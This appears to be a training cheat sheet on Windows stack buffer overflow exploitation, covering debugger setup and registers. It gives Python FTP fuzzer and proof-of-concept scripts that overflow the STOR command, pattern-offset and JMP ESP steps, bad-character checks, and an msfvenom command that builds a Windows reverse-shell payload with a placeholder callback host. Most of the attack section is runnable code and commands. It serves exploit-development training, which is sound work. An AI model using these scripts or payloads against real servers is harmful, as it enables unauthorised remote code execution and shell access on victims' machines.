---
title: Traditional Buffer Overflow Windows
category: BufferOverflow
layout: 2017/sheet
tags: [Featured]
updated: 2020-07-30
keywords:
  - BufferOverflow
  - 0xffff
  - stack
  - exploits
  - sec4us
  - mona
  - immunity
  - badchars
  - bytearray

---

GETTING STARTED
---------------
{: .-three-column}

### Introduction
{: .-intro}

This is a quick reference to getting started with Buffer Overflow.

- [Buffer Overflow Training](https://sec4us.com.br/exploit-development-p1/){:target="_blank"} _(learn from scratch show to create your own exploit exploring Buffer Overflow Windows)_
- [Linkedin page](https://www.linkedin.com/in/ederluis1973){:target="_blank"} _(Eder Luis - 0xffff)_
- [PDF Version Soon](https://sec4us.com.br){:target="_blank"} _(https://sec4us.com.br)_

### Immunity Debugger

**Install Immunity**

download after fill the form: 
[ https://debugger.immunityinc.com/ID_register.py ](https://debugger.immunityinc.com/ID_register.py)


### Configure Mona.py in Immunity Debugger

[download https://raw.githubusercontent.com/corelan/mona/master/mona.py](https://raw.githubusercontent.com/corelan/mona/master/mona.py)

put mona.py inside the **/pycommands** immunity directory

**Setting a **logs** directory inside Immunitydebugger**

```bash
!mona config -set workingfolder c:\logs\%p
```
* it is importart that the logs directory have been created in the windows machine with immunity.

REGISTERS
--------------------
{: .-three-column}

### What is Registers ?

Register is a small space used by CPU to store information.

### Registers - 32 bits

| 32 bits  | 16 bits |  8 bits   | |
|          |         | High | Low  |
| -------- | ------- | ---- | ---- |
| eax      |   ax    |  ah  |  al  |
| ecx      |   ax    |  ch  |  cl  |
| edx      |   dx    |  dh  |  dl  |
| ebx      |   bx    |  bh  |  bl  |
| esp      |   sp    |      | spl  |
| **EBP**      |   bp    |      | bpl  |
| esi      |   si    |      | sil  |
| edi      |   di    |      | dil  |


### IP - Instruction Pointer

Points to next instruction to be executed


| Register   | Description         |
| ---------- | ------------------- |
| `ip`         | 16 bits           |
| **`EIP `**        | 32 bits           |
| `rip`        | 64 bits           |


### SP - Stack Pointer

Points to top of stack


| Register   | Description         |
| ---------- | ------------------- |
| `sp`         | 16 bits           |
| **`ESP`**        | 32 bits           |
| `rsp`        | 64 bits           |


PROOF OF CONCEPT (POC)
----------------------
{: .-two-column}

### Example Connection FTP POC [poc-test.py]
```python
#!/usr/bin/python
import sys
import socket
import time
from struct import *

rhost = 'x.x.x.x'
port = 21

buffer = "A" * 100
buffer +='\r\n'
try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((rhost, port))
        print s.recv(2048)
        s.send('USER 0xffff\r\n')
        print s.recv(2048)
        s.send('PASS sec4us\r\n')
        print s.recv(2048)
        s.send('STOR ' + buffer)
        print s.recv(2048)
        s.close()
        print "Sent Buffer of %s bytes" %len(buffer)
except socket.error as error:
        s.close()
        print error
```

### Simple Connection FTP POC Fuzzer [fuzzer.py]
```python
#!/usr/bin/python

import socket, time

remoteip="x.x.x.x"
port=21

size=100
buffer = "A" * size
while True:

    print "Fuzzing with %s bytes" % len(buffer)
    s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((remoteip, port))
    except:
        print ("[-] Connection error!")
        sys.exit(1)

    print s.recv(1024)
    print "Sending username..."
    s.send('USER anonymous\r\n')
    print s.recv(1024)
    print "Sending pass..."
    s.send('PASS 0xffff@sec4us.com.br\r\n')
    print s.recv(1024)
    s.send('STOR ' + buffer +'\r\n')
    print s.recv(2048)
    s.close()
    time.sleep(1)
    size += 100
    buffer = "A" * size
    print "-------------------------"
```

BADCHARS
---------------------------
{: .-two-column}

### ASCII Table


| CHAR | DEC | OCT  | HEX | Linux |
| ---- | --- | ---  | --- | -----
| (nl) | 10  | 0012 | x0a |  \n |
| (cr) | 13  | 0015 | x0d |  \r |
| A    | 65  | 0101 | x41 |     |
| B    | 66  | 0102 | x42 |     |
| C    | 67  | 0103 | x43 |     |     

### Commom Badchars
After see the ascii tables, we have 3 common badchars that are bad for the applications

```bash
\x00 = Null Byte o end of string
\x0a = New Line \n (linux)
\x0d = Carriage Return  \r (linux)
```

TRADITIONAL BUFFER OVERFLOW WINDOWS - STEP BY STEP 
--------------------------------------------------
{: .-two-column}

### 1 - Run Fuzzer
Run the fuzzer to discover how many bytes you get a buffer overflow
```bash
./fuzzer.py
```

### 2 - Run POC
Run the POC to be sure you got a buffer overflow in the stack
```bash
./poc-test.py

```

### 3 - Discover EIP Position in the Stack
creating a pattern with the bytes discovered by fuzzer
```bash
msf-pattern_create -l xxx

Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```
inserting the pattern inside the POC and get the address in the EIP Register (**eipaddress**)


### 4 - Discover OFFSET
Discover How Many bytes of the Offset before EIP (yyy)

msf-pattern_offset -q EIPaddress

```bash
msf-pattern_offset -q 32674231
[*] Exact match at offset 965
```
Example: 
offset = "A" * yyy
offset = "A" * 965

### 5 - Make a Stack Fitting
it is time of building the exploit. We use in this example a space of the payload with 400 bytes in the ESP

Example:
```bash
offset = "A" * yyy
eip = "BBBB"
esp = "C" * 400
buffer = offset + eip + esp
```
### 6 - Search JMP ESP

inside immunity debugger

**!mona jmp -r esp -n**
choose a DLL with less protection (SEH, ASLR, etc)

Example:
```bash
offset = "A" * yyy
eip = jmpesp-address
esp = "C" * 400
buffer = offset + eip + esp
```
### 7 - Looking For BADCHARS

inside immunity debugger
```bash
!mona bytearray
!mona bytearray -cpb "\x00\x0a\x0d"
```
put the bytearray in your POC

```python
bytearray = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22"
"\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42"
"\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62"
"\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82"
"\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2"
"\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2"
"\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2"
"\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")
```
put your bytearray in the POC e run to get in the immunity the address of the start of the bytearray in the stack (ZZZZZZZZ)

Inside Immunity Debugger
```bash
!mona compare -f c:\logs\appname\bytearray.bin -a ZZZZZZZZ
```
### 8 - Build a Payload (reverseshell)

using the msfvenom to build a payload of the reverse shell

```bash
msfvenom -p windows/shell_reverse_tcp lhost=x.x.x.x lport=xxx -b "\x00\x0a\x0d\x......." -a x86 --platform win -v esp -f python
```

## Also see
{: .-one-column}

* [Build Exploits Exploring Buffer Overflow - Helvio Junior](https://www.helviojunior.com.br/category/it/security/criacao-de-exploits/){:target="_blank"}
* [Video: Understanding Buffer Overflow Concept](https://www.youtube.com/watch?v=wLi-dGphpdg&t=806s){:target="_blank"}
* [Video: How to do a Buffer Overflow](https://www.youtube.com/watch?v=oGZ01rvbfwE&t=6s){:target="_blank"}
